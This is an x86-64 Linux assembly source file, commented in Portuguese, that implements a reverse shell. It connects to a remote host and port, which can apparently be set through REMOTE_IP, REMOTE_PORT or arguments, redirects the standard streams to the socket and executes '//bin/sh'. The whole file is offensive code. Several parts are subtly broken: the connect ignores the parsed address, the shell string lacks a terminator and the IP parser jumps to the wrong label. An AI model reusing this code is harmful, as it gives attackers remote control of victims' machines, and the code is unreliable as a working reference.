section .data
    default_ip dd 0x0100007f         ; 127.0.0.1 (localhost)
    default_port dw 0x115c           ; Porta 4444 em big endian

    env_ip db "REMOTE_IP", 0
    env_port db "REMOTE_PORT", 0

    msg_socket db "[+] socket() ok", 10
    msg_connect db "[+] connect() ok", 10
    msg_dup2 db "[+] dup2() ok", 10
    msg_execve db "[+] execve() ok", 10
    msg_fail db "[!] erro em syscall", 10

section .bss
    ip_addr resd 1
    port_num resw 1
    buffer resb 128

section .text
    global _start

atoi:
    xor rax, rax
    xor rcx, rcx
.next_digit:
    movzx rdx, byte [rsi + rcx]
    test rdx, rdx
    jz .done
    sub rdx, '0'
    cmp rdx, 9
    ja .done
    imul rax, rax, 10
    add rax, rdx
    inc rcx
    jmp .next_digit
.done:
    ret

parse_ip:
    push rbp
    mov rbp, rsp
    sub rsp, 16

    xor rcx, rcx
    xor rdx, rdx
    xor rax, rax

.parse_octet:
    xor rdx, rdx
.next_digit:
    movzx r8, byte [rsi]
    test r8, r8
    jz .last_octet
    cmp r8, '.'
    je .octet_done
    sub r8, '0'
    cmp r8, 9
    ja .error
    imul rdx, rdx, 10
    add rdx, r8
    inc rsi
    jmp .next_digit

.octet_done:
    inc rsi
    cmp rdx, 255
    ja .error
    mov [rbp-16+rcx], dl
    inc rcx
    cmp rcx, 3
    jb .parse_octet
    jmp .next_digit

.last_octet:
    cmp rdx, 255
    ja .error
    mov [rbp-16+rcx], dl

    xor eax, eax
    mov al, [rbp-16+3]
    shl eax, 8
    mov al, [rbp-16+2]
    shl eax, 8
    mov al, [rbp-16+1]
    shl eax, 8
    mov al, [rbp-16+0]

    mov rsp, rbp
    pop rbp
    ret

.error:
    mov eax, [default_ip]
    mov rsp, rbp
    pop rbp
    ret

getenv:
    xor rcx, rcx
    mov r8, [rsp]
    lea r9, [rsp + 8]
    lea r9, [r9 + r8*8]
    add r9, 8

.next_env:
    mov rsi, [r9 + rcx*8]
    test rsi, rsi
    jz .not_found
    mov rdx, rdi
.compare:
    movzx rax, byte [rsi]
    movzx rbx, byte [rdx]
    test al, al
    jz .check_end
    test bl, bl
    jz .next_var
    cmp al, bl
    jne .next_var
    cmp al, '='
    je .found_env
    inc rsi
    inc rdx
    jmp .compare

.check_end:
    cmp byte [rdx], 0
    jne .next_var
    cmp byte [rsi], '='
    je .found_env

.next_var:
    inc rcx
    jmp .next_env

.found_env:
    movzx rax, byte [rsi]
    cmp al, '='
    je .return_value
    inc rsi
    jmp .found_env

.return_value:
    inc rsi
    mov rax, rsi
    ret

.not_found:
    xor rax, rax
    ret

_start:
    mov eax, [default_ip]
    mov [ip_addr], eax
    mov ax, [default_port]
    mov [port_num], ax

    mov rdi, env_ip
    call getenv
    test rax, rax
    jz .check_port_env
    mov rsi, rax
    call parse_ip
    mov [ip_addr], eax

.check_port_env:
    mov rdi, env_port
    call getenv
    test rax, rax
    jz .check_args
    mov rsi, rax
    call atoi
    xchg ah, al
    mov [port_num], ax

.check_args:
    mov rdi, [rsp]
    cmp rdi, 3
    jl .connect
    mov rsi, [rsp + 16]
    call parse_ip
    mov [ip_addr], eax
    mov rsi, [rsp + 24]
    call atoi
    xchg ah, al
    mov [port_num], ax

.connect:
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_socket
    mov rdx, 17
    syscall

    xor rax, rax
    mov al, 41
    xor rdi, rdi
    mov sil, 1
    xor rdx, rdx
    syscall

    mov rdi, rax
    sub rsp, 16
    mov word [rsp], 2
    mov word [rsp+2], 0x5c11
    mov dword [rsp+4], 0x0100007f
    xor rax, rax
    mov [rsp+8], rax

    mov rsi, rsp
    mov al, 42
    mov rdx, 16
    syscall

    test rax, rax
    js fail

    mov rax, 1
    mov rdi, 1
    mov rsi, msg_connect
    mov rdx, 18
    syscall

    xor rsi, rsi

.loop:
    mov al, 33
    syscall
    inc rsi
    cmp rsi, 3
    jl .loop

    mov rax, 1
    mov rdi, 1
    mov rsi, msg_dup2
    mov rdx, 15
    syscall

    xor rax, rax
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall

fail:
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_fail
    mov rdx, 21
    syscall

    mov rdi, 1
    mov al, 60
    syscall